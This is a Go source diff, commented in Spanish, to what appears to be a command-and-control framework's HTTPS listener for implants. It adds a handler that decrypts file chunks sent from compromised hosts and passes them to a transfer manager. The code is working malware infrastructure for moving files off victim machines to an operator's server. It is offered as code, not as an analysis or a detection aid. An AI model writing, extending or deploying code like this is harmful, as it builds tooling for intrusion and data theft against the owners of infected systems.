@@ -24,6 +24,7 @@ import (
 	"github.com/uLl0a/lavianc2/internal/protocol"
 	"github.com/uLl0a/lavianc2/internal/sessions"
 	"github.com/uLl0a/lavianc2/internal/storage"
+	"github.com/uLl0a/lavianc2/internal/transfers"
 )
 
 // HTTPSListener recibe check-ins de implantes vía HTTP/S.
@@ -48,6 +49,8 @@ type HTTPSListener struct {
 	serverKeys *crypto.ServerKeyStore
 	beaconMgr  *beacons.Manager
 
+	transfers *transfers.Manager
+
 	// Intervalo de rekey para las sesiones nuevas (0 = default).
 	rekeyEvery uint64
 
@@ -62,6 +65,7 @@ func NewHTTPSListener(
 	bus *events.Bus,
 	serverKeys *crypto.ServerKeyStore,
 	beaconMgr *beacons.Manager,
+	transferMgr *transfers.Manager,
 	certFile, keyFile string,
 	rekeyEvery uint64,
 	log *slog.Logger,
@@ -96,6 +100,7 @@ func NewHTTPSListener(
 		log:        log,
 		serverKeys: serverKeys,
 		beaconMgr:  beaconMgr,
+		transfers:  transferMgr,
 		rekeyEvery: rekeyEvery,
 		serverPriv: serverKeys.PrivateKey(),
 		profile:    profile,
@@ -110,6 +115,7 @@ func NewHTTPSListener(
 	l.router.MustRegister(protocol.MsgTaskResult, l.handleTaskResultEnvelope)
 	l.router.MustRegister(protocol.MsgHeartbeat, l.handleHeartbeatEnvelope)
 	l.router.MustRegister(protocol.MsgKeyRotation, l.handleKeyRotationEnvelope)
+	l.router.MustRegister(protocol.MsgFileChunk, l.handleFileChunkEnvelope)
 
 	bus.Subscribe(events.TopicImplantDead, func(ctx context.Context, ev events.Event) {
 		id, ok := ev.Payload.(uuid.UUID)
@@ -139,6 +145,42 @@ func NewHTTPSListener(
 		},
 	}
 	return l, nil
+}
+
+func (l *HTTPSListener) handleFileChunkEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
+	var wrapper protocol.EncryptedWrapper
+	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
+		return nil, fmt.Errorf("file chunk: wrapper inválido: %w", err)
+	}
+	implantID, err := uuid.Parse(wrapper.ImplantID)
+	if err != nil {
+		return nil, fmt.Errorf("file chunk: implant_id inválido: %w", err)
+	}
+
+	sc, ok := l.crypto.Get(ctx, implantID)
+	if !ok {
+		return nil, fmt.Errorf("file chunk: sesión %s sin claves", implantID)
+	}
+	plaintext, err := sc.DecryptFromBeacon(wrapper.Data, nil)
+	if err != nil {
+		return nil, fmt.Errorf("file chunk: descifrar: %w", err)
+	}
+
+	var wire protocol.FileTransferWire
+	if err := json.Unmarshal(plaintext, &wire); err != nil {
+		return nil, fmt.Errorf("file chunk: unmarshal: %w", err)
+	}
+
+	if l.transfers != nil {
+		if err := l.transfers.Handle(ctx, &wire, implantID); err != nil {
+			l.log.Warn("file chunk: handle", "err", err, "kind", wire.Kind, "id", wire.TransferID)
+			return nil, fmt.Errorf("file chunk: %w", err)
+		}
+	}
+
+	// ACK simple. El cliente puede ignorarlo, pero confirmar la recepción
+	// de cada chunk permite en el futuro implementar retransmisiones.
+	return protocol.NewEnvelope(protocol.MsgFileChunk, []byte("ok")), nil
 }
 
 func (l *HTTPSListener) handleEnvelope(w http.ResponseWriter, r *http.Request) {
